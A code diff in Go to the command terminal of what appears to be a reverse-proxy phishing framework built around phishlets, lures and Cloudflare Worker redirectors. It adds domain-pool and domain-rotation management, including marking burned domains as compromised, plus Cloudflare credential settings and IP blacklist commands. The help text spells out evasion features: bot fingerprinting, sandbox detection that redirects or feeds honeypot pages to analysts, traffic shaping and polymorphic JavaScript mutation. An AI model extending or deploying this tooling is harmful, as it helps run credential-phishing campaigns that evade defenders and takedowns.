@@ -170,6 +170,12 @@ func (t *Terminal) DoWork() {
 			if err != nil {
 				log.Error("whitelist: %v", err)
 			}
+		case "domains":
+			cmd_ok = true
+			err := t.handleDomains(args[1:])
+			if err != nil {
+				log.Error("domains: %v", err)
+			}
 		case "antibot":
 			cmd_ok = true
 			err := t.handleAntibot(args[1:])
@@ -561,6 +567,24 @@ func (t *Terminal) handleBlacklist(args []string) error {
 		case "off":
 			t.cfg.SetBlacklistMode(args[0])
 			return nil
+		case "list":
+			ips := t.p.bl.GetAllIPs()
+			if len(ips) == 0 {
+				log.Info("blacklist is empty")
+			} else {
+				log.Info("blacklisted IP addresses (%d):", len(ips))
+				for _, ip := range ips {
+					log.Info("  - %s", ip)
+				}
+			}
+			return nil
+		case "clear":
+			err := t.p.bl.Clear()
+			if err != nil {
+				return fmt.Errorf("failed to clear blacklist: %v", err)
+			}
+			log.Success("blacklist cleared")
+			return nil
 		}
 	} else if pn == 2 {
 		switch args[0] {
@@ -575,6 +599,20 @@ func (t *Terminal) handleBlacklist(args []string) error {
 				log.Info("blacklist log output: disabled")
 				return nil
 			}
+		case "add":
+			err := t.p.bl.AddIP(args[1])
+			if err != nil {
+				return fmt.Errorf("failed to add IP to blacklist: %v", err)
+			}
+			log.Success("added IP to blacklist: %s", args[1])
+			return nil
+		case "remove":
+			err := t.p.bl.RemoveIP(args[1])
+			if err != nil {
+				return fmt.Errorf("failed to remove IP from blacklist: %v", err)
+			}
+			log.Success("removed IP from blacklist: %s", args[1])
+			return nil
 		}
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
@@ -659,6 +697,154 @@ func (t *Terminal) handleWhitelist(args []string) error {
 		}
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
+}
+
+func (t *Terminal) handleDomains(args []string) error {
+	pn := len(args)
+
+	// No arguments - show all domain info
+	if pn == 0 {
+		log.Info("")
+		log.Info("Base Domain: %s", t.cfg.general.Domain)
+
+		domains := t.cfg.GetDomains()
+		if len(domains) > 0 {
+			log.Info("")
+			log.Info("Domain Pool:")
+			log.Info("─────────────────────────────────────────────────────────────")
+			for i, d := range domains {
+				status := "disabled"
+				if d.Enabled {
+					status = "enabled"
+				}
+				primary := ""
+				if d.IsPrimary {
+					primary = " [PRIMARY]"
+				}
+				log.Info("%d. %s (%s)%s", i+1, d.Domain, status, primary)
+				if d.Description != "" {
+					log.Info("   Description: %s", d.Description)
+				}
+			}
+			log.Info("─────────────────────────────────────────────────────────────")
+		} else {
+			log.Info("Domain Pool: empty")
+		}
+
+		log.Info("")
+		log.Info("Use 'domains set <domain>' to set base domain")
+		log.Info("Use 'domains add <domain>' to add to pool")
+		log.Info("Use 'domains rotation' for domain rotation settings")
+		return nil
+	}
+
+	switch args[0] {
+	case "set":
+		if pn < 2 {
+			return fmt.Errorf("syntax: domains set <domain>")
+		}
+		t.cfg.SetBaseDomain(args[1])
+		t.cfg.ResetAllSites()
+		t.manageCertificates(false)
+		log.Success("base domain set to: %s", args[1])
+		return nil
+
+	case "list":
+		domains := t.cfg.GetDomains()
+		if len(domains) == 0 {
+			log.Info("no domains configured")
+			return nil
+		}
+		log.Info("\nConfigured Domains:")
+		log.Info("─────────────────────────────────────────────────────────────")
+		for i, d := range domains {
+			status := "disabled"
+			if d.Enabled {
+				status = "enabled"
+			}
+			primary := ""
+			if d.IsPrimary {
+				primary = " [PRIMARY]"
+			}
+			log.Info("%d. %s (%s)%s", i+1, d.Domain, status, primary)
+			if d.Description != "" {
+				log.Info("   Description: %s", d.Description)
+			}
+			if d.AddedAt != "" {
+				log.Info("   Added: %s", d.AddedAt)
+			}
+		}
+		log.Info("─────────────────────────────────────────────────────────────")
+		return nil
+
+	case "add":
+		if pn < 2 {
+			return fmt.Errorf("syntax: domains add <domain> [description]")
+		}
+		description := ""
+		if pn >= 3 {
+			description = strings.Join(args[2:], " ")
+		}
+		err := t.cfg.AddDomain(args[1], description)
+		if err != nil {
+			return err
+		}
+		t.manageCertificates(false)
+		log.Success("domain added: %s", args[1])
+		return nil
+
+	case "remove":
+		if pn < 2 {
+			return fmt.Errorf("syntax: domains remove <domain>")
+		}
+		err := t.cfg.RemoveDomain(args[1])
+		if err != nil {
+			return err
+		}
+		t.manageCertificates(false)
+		log.Success("domain removed: %s", args[1])
+		return nil
+
+	case "set-primary":
+		if pn < 2 {
+			return fmt.Errorf("syntax: domains set-primary <domain>")
+		}
+		err := t.cfg.SetPrimaryDomain(args[1])
+		if err != nil {
+			return err
+		}
+		t.manageCertificates(false)
+		log.Success("primary domain set to: %s", args[1])
+		return nil
+
+	case "enable":
+		if pn < 2 {
+			return fmt.Errorf("syntax: domains enable <domain>")
+		}
+		err := t.cfg.EnableDomain(args[1], true)
+		if err != nil {
+			return err
+		}
+		log.Success("domain enabled: %s", args[1])
+		return nil
+
+	case "disable":
+		if pn < 2 {
+			return fmt.Errorf("syntax: domains disable <domain>")
+		}
+		err := t.cfg.EnableDomain(args[1], false)
+		if err != nil {
+			return err
+		}
+		log.Success("domain disabled: %s", args[1])
+		return nil
+
+	case "rotation":
+		return t.handleDomainRotation(args[1:])
+
+	default:
+		return fmt.Errorf("unknown domains subcommand: %s", args[0])
+	}
 }
 
 func (t *Terminal) handleJA3(args []string) error {
@@ -2974,36 +3160,102 @@ func (t *Terminal) handleCloudflare(args []string) error {
 
 	// Handle 'cloudflare config' command
 	if pn > 0 && args[0] == "config" {
-		cfConfig := t.cfg.GetCloudflareWorkerConfig()
+		// If just "cloudflare config" — show current config
+		if pn == 1 {
+			cfConfig := t.cfg.GetCloudflareWorkerConfig()
 
-		log.Info("cloudflare worker configuration:")
-		log.Info("  enabled: %v", cfConfig.Enabled)
-		if cfConfig.AccountID != "" {
-			log.Info("  account_id: %s", hiblue.Sprint(cfConfig.AccountID))
-		} else {
-			log.Info("  account_id: %s", red.Sprint("not set"))
-		}
-		if cfConfig.APIToken != "" {
-			log.Info("  api_token: %s", hiblue.Sprint("***hidden***"))
-		} else {
-			log.Info("  api_token: %s", red.Sprint("not set"))
-		}
-		if cfConfig.ZoneID != "" {
-			log.Info("  zone_id: %s", hiblue.Sprint(cfConfig.ZoneID))
-		} else {
-			log.Info("  zone_id: %s", yellow.Sprint("not set (optional)"))
-		}
-		if cfConfig.WorkerSubdomain != "" {
-			log.Info("  subdomain: %s", hiblue.Sprint(cfConfig.WorkerSubdomain))
-		} else {
-			log.Info("  subdomain: %s", yellow.Sprint("not set"))
+			log.Info("cloudflare worker configuration:")
+			log.Info("  enabled: %v", cfConfig.Enabled)
+			if cfConfig.AccountID != "" {
+				log.Info("  account_id: %s", hiblue.Sprint(cfConfig.AccountID))
+			} else {
+				log.Info("  account_id: %s", red.Sprint("not set"))
+			}
+			if cfConfig.APIToken != "" {
+				log.Info("  api_token: %s", hiblue.Sprint("***hidden***"))
+			} else {
+				log.Info("  api_token: %s", red.Sprint("not set"))
+			}
+			if cfConfig.ZoneID != "" {
+				log.Info("  zone_id: %s", hiblue.Sprint(cfConfig.ZoneID))
+			} else {
+				log.Info("  zone_id: %s", yellow.Sprint("not set (optional)"))
+			}
+			if cfConfig.WorkerSubdomain != "" {
+				log.Info("  subdomain: %s", hiblue.Sprint(cfConfig.WorkerSubdomain))
+			} else {
+				log.Info("  subdomain: %s", yellow.Sprint("not set"))
+			}
+
+			if !t.cfg.IsCloudflareWorkerEnabled() {
+				log.Warning("cloudflare worker deployment is not properly configured")
+				log.Info("use 'cloudflare config <setting> <value>' to configure")
+			}
+			return nil
 		}
 
-		if !t.cfg.IsCloudflareWorkerEnabled() {
-			log.Warning("cloudflare worker deployment is not properly configured")
-			log.Info("use 'config cloudflare_worker <setting> <value>' to configure")
+		// Handle "cloudflare config <setting> [value]"
+		setting := args[1]
+		switch setting {
+		case "account_id":
+			if pn < 3 {
+				return fmt.Errorf("syntax: cloudflare config account_id <id>")
+			}
+			t.cfg.SetCloudflareWorkerAccountID(args[2])
+			log.Success("cloudflare account_id set")
+			return nil
+		case "api_token":
+			if pn < 3 {
+				return fmt.Errorf("syntax: cloudflare config api_token <token>")
+			}
+			t.cfg.SetCloudflareWorkerAPIToken(args[2])
+			log.Success("cloudflare api_token set")
+			return nil
+		case "zone_id":
+			if pn < 3 {
+				return fmt.Errorf("syntax: cloudflare config zone_id <id>")
+			}
+			t.cfg.SetCloudflareWorkerZoneID(args[2])
+			log.Success("cloudflare zone_id set")
+			return nil
+		case "subdomain":
+			if pn < 3 {
+				return fmt.Errorf("syntax: cloudflare config subdomain <subdomain>")
+			}
+			t.cfg.SetCloudflareWorkerSubdomain(args[2])
+			log.Success("cloudflare subdomain set to: %s", args[2])
+			return nil
+		case "enabled":
+			if pn < 3 {
+				return fmt.Errorf("syntax: cloudflare config enabled <true|false>")
+			}
+			switch args[2] {
+			case "true":
+				t.cfg.SetCloudflareWorkerEnabled(true)
+				log.Success("cloudflare worker deployment enabled")
+			case "false":
+				t.cfg.SetCloudflareWorkerEnabled(false)
+				log.Success("cloudflare worker deployment disabled")
+			default:
+				return fmt.Errorf("invalid value: %s (use 'true' or 'false')", args[2])
+			}
+			return nil
+		case "test":
+			cfConfig := t.cfg.GetCloudflareWorkerConfig()
+			if cfConfig.AccountID == "" || cfConfig.APIToken == "" {
+				return fmt.Errorf("cloudflare account_id and api_token must be configured first")
+			}
+			api := NewCloudflareWorkerAPI(cfConfig.AccountID, cfConfig.APIToken, cfConfig.ZoneID)
+			err := api.ValidateCredentials()
+			if err != nil {
+				log.Error("cloudflare: %s", err)
+			} else {
+				log.Success("cloudflare: credentials validated successfully")
+			}
+			return nil
+		default:
+			return fmt.Errorf("unknown config setting: %s (use: account_id, api_token, zone_id, subdomain, enabled, test)", setting)
 		}
-		return nil
 	}
 
 	// Handle 'cloudflare deploy' command
@@ -3419,7 +3671,50 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("lures", []string{"edit", "og_image"}, "edit <id> og_image <title>", "sets opengraph image url that will be shown in link preview, for a lure with a given <id>")
 	h.AddSubCommand("lures", []string{"edit", "og_url"}, "edit <id> og_url <title>", "sets opengraph url that will be shown in link preview, for a lure with a given <id>")
 
-	h.AddCommand("cloudflare", "general", "manage Cloudflare Worker scripts", "Generate and deploy Cloudflare Worker scripts for redirectors.", LAYER_TOP,
+	h.AddCommand("domains", "general", "manage domain configuration and rotation", "Unified domain management: set base domain, manage domain pool, and configure domain rotation.", LAYER_TOP,
+		readline.PcItem("domains",
+			readline.PcItem("set"),
+			readline.PcItem("list"),
+			readline.PcItem("add"),
+			readline.PcItem("remove"),
+			readline.PcItem("set-primary"),
+			readline.PcItem("enable"),
+			readline.PcItem("disable"),
+			readline.PcItem("rotation",
+				readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")),
+				readline.PcItem("strategy", readline.PcItem("round-robin"), readline.PcItem("weighted"), readline.PcItem("health-based"), readline.PcItem("random")),
+				readline.PcItem("interval"),
+				readline.PcItem("max-domains"),
+				readline.PcItem("auto-generate", readline.PcItem("on"), readline.PcItem("off")),
+				readline.PcItem("add-domain"),
+				readline.PcItem("remove-domain"),
+				readline.PcItem("list"),
+				readline.PcItem("add-provider"),
+				readline.PcItem("mark-compromised"),
+				readline.PcItem("stats"))))
+
+	h.AddSubCommand("domains", nil, "", "show base domain, domain pool, and rotation status")
+	h.AddSubCommand("domains", []string{"set"}, "set <domain>", "set the base domain for all phishlets")
+	h.AddSubCommand("domains", []string{"list"}, "list", "list all configured domains with status and primary flag")
+	h.AddSubCommand("domains", []string{"add"}, "add <domain> [description]", "add a new domain to the multi-domain pool")
+	h.AddSubCommand("domains", []string{"remove"}, "remove <domain>", "remove a domain from the pool")
+	h.AddSubCommand("domains", []string{"set-primary"}, "set-primary <domain>", "set which domain is the primary domain")
+	h.AddSubCommand("domains", []string{"enable"}, "enable <domain>", "enable a domain for use")
+	h.AddSubCommand("domains", []string{"disable"}, "disable <domain>", "disable a domain (keeps it in pool but inactive)")
+	h.AddSubCommand("domains", []string{"rotation"}, "rotation", "show domain rotation configuration")
+	h.AddSubCommand("domains", []string{"rotation", "enable"}, "rotation enable <on|off>", "enable or disable automatic domain rotation")
+	h.AddSubCommand("domains", []string{"rotation", "strategy"}, "rotation strategy <round-robin|weighted|health-based|random>", "set rotation strategy")
+	h.AddSubCommand("domains", []string{"rotation", "interval"}, "rotation interval <minutes>", "set rotation interval in minutes")
+	h.AddSubCommand("domains", []string{"rotation", "max-domains"}, "rotation max-domains <count>", "set maximum number of domains in pool")
+	h.AddSubCommand("domains", []string{"rotation", "auto-generate"}, "rotation auto-generate <on|off>", "enable or disable automatic domain generation")
+	h.AddSubCommand("domains", []string{"rotation", "add-domain"}, "rotation add-domain <domain> <subdomain> <provider>", "add a domain to the rotation pool")
+	h.AddSubCommand("domains", []string{"rotation", "remove-domain"}, "rotation remove-domain <full_domain>", "remove a domain from the rotation pool")
+	h.AddSubCommand("domains", []string{"rotation", "list"}, "rotation list", "list all domains in the rotation pool")
+	h.AddSubCommand("domains", []string{"rotation", "add-provider"}, "rotation add-provider <name> <type> <api_key> <api_secret> <zone>", "add a DNS provider for domain rotation")
+	h.AddSubCommand("domains", []string{"rotation", "mark-compromised"}, "rotation mark-compromised <full_domain> <reason>", "mark a domain as compromised")
+	h.AddSubCommand("domains", []string{"rotation", "stats"}, "rotation stats", "show detailed rotation statistics")
+
+	h.AddCommand("cloudflare", "general", "manage Cloudflare Workers and configuration", "Generate, deploy, and manage Cloudflare Worker scripts. Configure API credentials.", LAYER_TOP,
 		readline.PcItem("cloudflare",
 			readline.PcItem("worker", readline.PcItem("simple"), readline.PcItem("html"), readline.PcItem("advanced")),
 			readline.PcItem("deploy"),
@@ -3427,7 +3722,13 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("delete"),
 			readline.PcItem("update"),
 			readline.PcItem("status"),
-			readline.PcItem("config")))
+			readline.PcItem("config",
+				readline.PcItem("account_id"),
+				readline.PcItem("api_token"),
+				readline.PcItem("zone_id"),
+				readline.PcItem("subdomain"),
+				readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")),
+				readline.PcItem("test"))))
 	h.AddSubCommand("cloudflare", []string{"worker"}, "worker <type> <redirect_url> [options]", "generate a Cloudflare Worker script")
 	h.AddSubCommand("cloudflare", []string{"worker", "simple"}, "worker simple <redirect_url>", "generate a simple redirect Worker")
 	h.AddSubCommand("cloudflare", []string{"worker", "html"}, "worker html <redirect_url>", "generate an HTML redirector Worker")
@@ -3438,9 +3739,15 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("cloudflare", []string{"update"}, "update <worker_name> <redirect_url>", "update a Worker's redirect URL")
 	h.AddSubCommand("cloudflare", []string{"status"}, "status <worker_name>", "check a Worker's deployment status")
 	h.AddSubCommand("cloudflare", []string{"config"}, "config", "show Cloudflare Worker configuration")
+	h.AddSubCommand("cloudflare", []string{"config", "account_id"}, "config account_id <id>", "set the Cloudflare account ID")
+	h.AddSubCommand("cloudflare", []string{"config", "api_token"}, "config api_token <token>", "set the Cloudflare API token")
+	h.AddSubCommand("cloudflare", []string{"config", "zone_id"}, "config zone_id <id>", "set the Cloudflare zone ID (optional)")
+	h.AddSubCommand("cloudflare", []string{"config", "subdomain"}, "config subdomain <subdomain>", "set the workers.dev subdomain")
+	h.AddSubCommand("cloudflare", []string{"config", "enabled"}, "config enabled <true|false>", "enable or disable Cloudflare Worker deployment")
+	h.AddSubCommand("cloudflare", []string{"config", "test"}, "config test", "test the Cloudflare API credentials")
 
 	h.AddCommand("blacklist", "general", "manage automatic blacklisting of requesting ip addresses", "Select what kind of requests should result in requesting IP addresses to be blacklisted.", LAYER_TOP,
-		readline.PcItem("blacklist", readline.PcItem("all"), readline.PcItem("unauth"), readline.PcItem("noadd"), readline.PcItem("off"), readline.PcItem("log", readline.PcItem("on"), readline.PcItem("off"))))
+		readline.PcItem("blacklist", readline.PcItem("all"), readline.PcItem("unauth"), readline.PcItem("noadd"), readline.PcItem("off"), readline.PcItem("list"), readline.PcItem("add"), readline.PcItem("remove"), readline.PcItem("clear"), readline.PcItem("log", readline.PcItem("on"), readline.PcItem("off"))))
 
 	h.AddSubCommand("blacklist", nil, "", "show current blacklisting mode")
 	h.AddSubCommand("blacklist", []string{"all"}, "all", "block and blacklist ip addresses for every single request (even authorized ones!)")
@@ -3448,6 +3755,10 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("blacklist", []string{"noadd"}, "noadd", "block but do not add new ip addresses to blacklist")
 	h.AddSubCommand("blacklist", []string{"off"}, "off", "ignore blacklist and allow every request to go through")
 	h.AddSubCommand("blacklist", []string{"log"}, "log <on|off>", "enable or disable log output for blacklist messages")
+	h.AddSubCommand("blacklist", []string{"list"}, "list", "list all blacklisted IP addresses")
+	h.AddSubCommand("blacklist", []string{"add"}, "add <ip_address>", "manually add an IP address to the blacklist")
+	h.AddSubCommand("blacklist", []string{"remove"}, "remove <ip_address>", "remove an IP address from the blacklist")
+	h.AddSubCommand("blacklist", []string{"clear"}, "clear", "remove all IP addresses from the blacklist")
 
 	h.AddCommand("whitelist", "general", "manage IP whitelist to allow only specific IP addresses", "When enabled, only IP addresses in the whitelist will be allowed to access the phishing infrastructure.", LAYER_TOP,
 		readline.PcItem("whitelist", readline.PcItem("on"), readline.PcItem("off"), readline.PcItem("add"), readline.PcItem("remove"), readline.PcItem("list"), readline.PcItem("clear"), readline.PcItem("log", readline.PcItem("on"), readline.PcItem("off"))))
@@ -3468,12 +3779,12 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("spoof_url"), 
 			readline.PcItem("threshold"), 
 			readline.PcItem("override_ips", readline.PcItem("list"), readline.PcItem("add"), readline.PcItem("remove")),
-			readline.PcItem("ja3"),
-			readline.PcItem("captcha"),
-			readline.PcItem("domain-rotation"),
-			readline.PcItem("traffic-shaping"),
-			readline.PcItem("sandbox"),
-			readline.PcItem("polymorphic")))
+			readline.PcItem("ja3", readline.PcItem("stats"), readline.PcItem("signatures"), readline.PcItem("add"), readline.PcItem("export")),
+			readline.PcItem("captcha", readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("provider"), readline.PcItem("configure"), readline.PcItem("require", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("test")),
+			readline.PcItem("domain-rotation", readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("strategy"), readline.PcItem("interval"), readline.PcItem("list"), readline.PcItem("stats")),
+			readline.PcItem("traffic-shaping", readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("mode"), readline.PcItem("global-limit"), readline.PcItem("ip-limit"), readline.PcItem("bandwidth-limit"), readline.PcItem("geo-rule"), readline.PcItem("stats")),
+			readline.PcItem("sandbox", readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("mode"), readline.PcItem("threshold"), readline.PcItem("action"), readline.PcItem("redirect"), readline.PcItem("honeypot"), readline.PcItem("stats")),
+			readline.PcItem("polymorphic", readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("level"), readline.PcItem("cache"), readline.PcItem("seed-rotation"), readline.PcItem("template-mode"), readline.PcItem("mutation"), readline.PcItem("test"), readline.PcItem("stats"))))
 
 	h.AddSubCommand("antibot", nil, "", "show main antibot configuration menu")
 	h.AddSubCommand("antibot", []string{"enabled"}, "enabled <true|false>", "enable or disable antibot detection")
@@ -3484,12 +3795,53 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("antibot", []string{"override_ips", "add"}, "override_ips add <ip>", "whitelist IP to bypass antibot checks")
 	h.AddSubCommand("antibot", []string{"override_ips", "remove"}, "override_ips remove <ip>", "remove IP from antibot whitelist")
 	
-	h.AddSubCommand("antibot", []string{"ja3"}, "ja3 [stats|signatures|add|export]", "manage JA3/JA3S TLS fingerprinting")
-	h.AddSubCommand("antibot", []string{"captcha"}, "captcha [enable|provider|configure|require|test]", "manage CAPTCHA protection")
-	h.AddSubCommand("antibot", []string{"domain-rotation"}, "domain-rotation [enable|strategy|interval|stats...]", "manage automatic domain rotation")
-	h.AddSubCommand("antibot", []string{"traffic-shaping"}, "traffic-shaping [enable|mode|global-limit|stats...]", "manage traffic shaping")
-	h.AddSubCommand("antibot", []string{"sandbox"}, "sandbox [enable|mode|action|stats...]", "manage sandbox detection")
-	h.AddSubCommand("antibot", []string{"polymorphic"}, "polymorphic [enable|level|cache|stats...]", "manage polymorphic JavaScript engine")
+	h.AddSubCommand("antibot", []string{"ja3"}, "ja3", "show JA3/JA3S fingerprinting statistics")
+	h.AddSubCommand("antibot", []string{"ja3", "stats"}, "ja3 stats", "show detailed JA3 capture and detection statistics")
+	h.AddSubCommand("antibot", []string{"ja3", "signatures"}, "ja3 signatures", "list all known bot JA3 signatures")
+	h.AddSubCommand("antibot", []string{"ja3", "add"}, "ja3 add <name> <ja3_hash> <description>", "add a custom bot JA3 signature")
+	h.AddSubCommand("antibot", []string{"ja3", "export"}, "ja3 export", "export all JA3 signatures to a timestamped JSON file")
+
+	h.AddSubCommand("antibot", []string{"captcha"}, "captcha", "show current CAPTCHA configuration and provider status")
+	h.AddSubCommand("antibot", []string{"captcha", "enable"}, "captcha enable <on|off>", "enable or disable CAPTCHA protection")
+	h.AddSubCommand("antibot", []string{"captcha", "provider"}, "captcha provider <name>", "set active CAPTCHA provider")
+	h.AddSubCommand("antibot", []string{"captcha", "configure"}, "captcha configure <provider> <site_key> <secret_key> [options]", "configure a CAPTCHA provider")
+	h.AddSubCommand("antibot", []string{"captcha", "require"}, "captcha require <on|off>", "require CAPTCHA verification for all lures")
+	h.AddSubCommand("antibot", []string{"captcha", "test"}, "captcha test", "display test page URL for verifying CAPTCHA integration")
+
+	h.AddSubCommand("antibot", []string{"domain-rotation"}, "domain-rotation", "show domain rotation configuration (also available via 'domains rotation')")
+	h.AddSubCommand("antibot", []string{"domain-rotation", "enable"}, "domain-rotation enable <on|off>", "enable or disable automatic domain rotation")
+	h.AddSubCommand("antibot", []string{"domain-rotation", "strategy"}, "domain-rotation strategy <round-robin|weighted|health-based|random>", "set rotation strategy")
+	h.AddSubCommand("antibot", []string{"domain-rotation", "interval"}, "domain-rotation interval <minutes>", "set rotation interval")
+	h.AddSubCommand("antibot", []string{"domain-rotation", "list"}, "domain-rotation list", "list all domains in the rotation pool")
+	h.AddSubCommand("antibot", []string{"domain-rotation", "stats"}, "domain-rotation stats", "show rotation statistics")
+
+	h.AddSubCommand("antibot", []string{"traffic-shaping"}, "traffic-shaping", "show traffic shaping configuration and metrics")
+	h.AddSubCommand("antibot", []string{"traffic-shaping", "enable"}, "traffic-shaping enable <on|off>", "enable or disable traffic shaping")
+	h.AddSubCommand("antibot", []string{"traffic-shaping", "mode"}, "traffic-shaping mode <adaptive|strict|learning>", "set traffic shaping mode")
+	h.AddSubCommand("antibot", []string{"traffic-shaping", "global-limit"}, "traffic-shaping global-limit <rate> <burst>", "set global request rate limit")
+	h.AddSubCommand("antibot", []string{"traffic-shaping", "ip-limit"}, "traffic-shaping ip-limit <rate> <burst>", "set per-IP request rate limit")
+	h.AddSubCommand("antibot", []string{"traffic-shaping", "bandwidth-limit"}, "traffic-shaping bandwidth-limit <bytes/sec>", "set bandwidth limit")
+	h.AddSubCommand("antibot", []string{"traffic-shaping", "geo-rule"}, "traffic-shaping geo-rule <country> <rate> <burst> <priority> <block>", "add geographic rate-limiting rule")
+	h.AddSubCommand("antibot", []string{"traffic-shaping", "stats"}, "traffic-shaping stats", "show detailed traffic statistics")
+
+	h.AddSubCommand("antibot", []string{"sandbox"}, "sandbox", "show sandbox detection configuration and statistics")
+	h.AddSubCommand("antibot", []string{"sandbox", "enable"}, "sandbox enable <on|off>", "enable or disable sandbox detection")
+	h.AddSubCommand("antibot", []string{"sandbox", "mode"}, "sandbox mode <passive|active|aggressive>", "set detection mode")
+	h.AddSubCommand("antibot", []string{"sandbox", "threshold"}, "sandbox threshold <0.0-1.0>", "set detection confidence threshold")
+	h.AddSubCommand("antibot", []string{"sandbox", "action"}, "sandbox action <block|redirect|honeypot>", "set action on sandbox detection")
+	h.AddSubCommand("antibot", []string{"sandbox", "redirect"}, "sandbox redirect <url>", "set sandbox redirect URL")
+	h.AddSubCommand("antibot", []string{"sandbox", "honeypot"}, "sandbox honeypot <html>", "set sandbox honeypot HTML response")
+	h.AddSubCommand("antibot", []string{"sandbox", "stats"}, "sandbox stats", "show sandbox detection statistics")
+
+	h.AddSubCommand("antibot", []string{"polymorphic"}, "polymorphic", "show polymorphic engine configuration and statistics")
+	h.AddSubCommand("antibot", []string{"polymorphic", "enable"}, "polymorphic enable <on|off>", "enable or disable dynamic code mutation")
+	h.AddSubCommand("antibot", []string{"polymorphic", "level"}, "polymorphic level <low|medium|high|extreme>", "set mutation level")
+	h.AddSubCommand("antibot", []string{"polymorphic", "cache"}, "polymorphic cache <on|off|clear>", "manage the mutation cache")
+	h.AddSubCommand("antibot", []string{"polymorphic", "seed-rotation"}, "polymorphic seed-rotation <minutes>", "set seed rotation interval")
+	h.AddSubCommand("antibot", []string{"polymorphic", "template-mode"}, "polymorphic template-mode <on|off>", "enable or disable template-based mutations")
+	h.AddSubCommand("antibot", []string{"polymorphic", "mutation"}, "polymorphic mutation <type> <on|off>", "toggle mutation type (variables, functions, deadcode, controlflow, strings, math, comments, whitespace)")
+	h.AddSubCommand("antibot", []string{"polymorphic", "test"}, "polymorphic test [code]", "test mutations on sample JavaScript (generates 3 variants)")
+	h.AddSubCommand("antibot", []string{"polymorphic", "stats"}, "polymorphic stats", "show mutation statistics and cache hit rate")
 
 	h.AddCommand("test-certs", "general", "test TLS certificates for active phishlets", "Test availability of set up TLS certificates for active phishlets.", LAYER_TOP,
 		readline.PcItem("test-certs"))
